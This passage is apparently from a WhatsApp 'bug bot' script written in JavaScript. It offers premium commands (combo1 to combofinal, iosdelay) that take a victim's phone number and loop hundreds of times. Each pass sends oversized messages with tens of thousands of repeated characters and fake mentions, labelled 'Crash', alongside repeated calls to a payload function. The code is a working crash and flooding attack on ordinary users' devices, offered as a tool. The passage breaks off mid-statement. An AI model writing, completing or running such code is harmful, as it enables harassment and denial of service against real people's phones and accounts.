          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await p.relayMessage(v68, {
            extendedTextMessage: {
              text: "𝙑𝙞𝙣𝙘𝙣𝙩𝟤𓍯𓂃" + "ꦾ".repeat(88888),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v68
            }
          });
          await p.relayMessage(v68, {
            extendedTextMessage: {
              text: "\n" + "@6285929014979".repeat(80000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net"]
              }
            }
          }, {
            participant: {
              jid: v68
            }
          });
          await p.relayMessage(v68, {
            extendedTextMessage: {
              text: " C꙲r꙲a꙲s꙲h꙲h꙲h꙲ 🪤 " + "@6285929014979".repeat(97777),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v68
            }
          });
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await p.relayMessage(v68, {
            extendedTextMessage: {
              text: " 🥳 " + "ꦾ".repeat(40000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v68
            }
          });
          await p.relayMessage(v68, {
            extendedTextMessage: {
              text: "Hallo " + "@6285929014979".repeat(10000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net"]
              }
            }
          }, {
            participant: {
              jid: v68
            }
          });
          await p.relayMessage(v68, {
            extendedTextMessage: {
              text: "crash C꙲r꙲a꙲s꙲h꙲h꙲h꙲h꙲h꙲h꙲h꙲h꙲h꙲E꙲r꙲r꙲r꙲r꙲r꙲ Z꙲h꙲e꙲n꙲n꙲n꙲X꙲y꙲ " + "@6285929014979".repeat(10000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v68
            }
          });
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await p.relayMessage(v68, {
            extendedTextMessage: {
              text: "🎃🔥 Xvincent-🔥☠️🎃🔥🪤" + "ꦾ".repeat(50000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 85000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v68
            }
          });
          await p.relayMessage(v68, {
            extendedTextMessage: {
              text: "Halllo " + "@6285929014979".repeat(10000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net"]
              }
            }
          }, {
            participant: {
              jid: v68
            }
          });
          await p.relayMessage(v68, {
            extendedTextMessage: {
              text: "crash 🩸 " + "@6285929014979".repeat(100000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v68
            }
          });
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
        }
      }
      break;
    case "combo1":
    case "combo2":
    case "combo3":
    case "combofinal":
    case "iosdelay":
      {
        if (!v12) {
          return vF3("Fitur Khusus Premium!!");
        }
        if (!q) {
          return vF3("Gunakan Comand Berikut " + v7 + " 628xxx");
        }
        let v70 = q.replace(/[^0-9]/g, "");
        if (v70.startsWith("0")) {
          return vF3("Gunakan Nomor Dengan Kode Negara");
        }
        let v71 = v70 + "@s.whatsapp.net";
        if (v71 === "6281911317205@s.whatsapp.net") {
          return vF3("Target Salah!!");
        }
        vF3("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜ホ\n> 𝙅𝙚𝙙𝙖 𝟩 𝙈𝙚𝙣𝙞𝙩 𝘽𝙞𝙖𝙧 𝙂𝙖 𝙆𝙚𝙣𝙤𝙣‼️ ");
        for (let v72 = 0; v72 < 400; v72++) {
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await f5(v71, Ptcp = true);
          await p.relayMessage(v71, {
            extendedTextMessage: {
